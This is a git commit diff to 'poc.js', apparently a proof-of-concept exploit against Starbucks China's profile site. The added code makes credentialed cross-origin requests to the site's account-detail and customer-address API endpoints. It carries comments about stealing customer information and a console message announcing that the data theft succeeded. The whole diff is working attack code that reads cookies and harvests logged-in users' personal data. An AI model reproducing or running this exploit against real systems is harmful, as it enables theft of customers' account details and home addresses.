f2848d24967aebd80d9c2a547ef48eda41ae69d1
koffdsa <51981550@qq.com>
2020-09-02 23:18:23 +0800

    Update poc.js

--- js/poc.js
+++ js/poc.js
@@ -1,4 +1,5 @@
 alert(document.cookie);//
+//steal the customer's information
 var steal = new XMLHttpRequest();
 steal.open('get', 'https://profile.starbucks.com.cn/api/account/detail');
 steal.withCredentials = true;
@@ -7,5 +8,17 @@ steal.onreadystatechange = function () {
       if (steal.readyState == 4 && steal.status == 200) {
             console.log('数据偷取成功');
             alert(steal.responseText);
+    }
+}
+
+
+var stealAddress = new XMLHttpRequest();
+stealAddress.open('get', 'https://profile.starbucks.com.cn/api/Customers/addresses/list');
+stealAddress.withCredentials = true;
+stealAddress.send();
+stealAddress.onreadystatechange = function () {
+      if (stealAddress.readyState == 4 && stealAddress.status == 200) {
+            console.log('数据偷取成功');
+            alert(stealAddress.responseText);
     }
 }
